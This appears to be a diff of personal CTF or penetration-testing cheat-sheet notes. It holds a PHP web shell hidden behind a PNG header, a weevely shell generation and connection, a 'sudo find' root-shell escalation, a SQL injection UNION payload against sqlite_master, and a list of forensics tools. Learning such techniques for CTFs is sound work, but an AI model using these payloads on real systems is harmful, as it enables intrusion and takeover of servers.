@@ -3,6 +3,15 @@ trickster:
 PNG
 <?php system($_GET['cmd']) ;?>
 reverse shell
+====================================================================================================
+using weevely 
+python3.12 /usr/bin/weevely passwd shell.php 
+python3.12 /usr/bin/weevely http://website.com:port/uploads/shell.php passwd
+
+sudo -u root ls /root
+check sudo -l 
+if find is available use arbitrary code like this : sudo find . -exec /bin/sh \;
+=====================================================================================================
 php server 
 php -S localhost:8080
 
@@ -21,4 +30,13 @@ Algiers' UNION SELECT 1,2,SQL  from sqlite_master -- - GET THE CREATE DATA BASE 
 =========================================================================================
 for jwt , use jwt.io or this if that didnt work:https://10015.io/tools/jwt-encoder-decoder
 ===========================================================================================
+fornsics: 
+commands so far :
+binwalk
+foremost
+xxd
+file 
+exiftool
+gem install zsteg
+then run zsteg -a file.png 
 
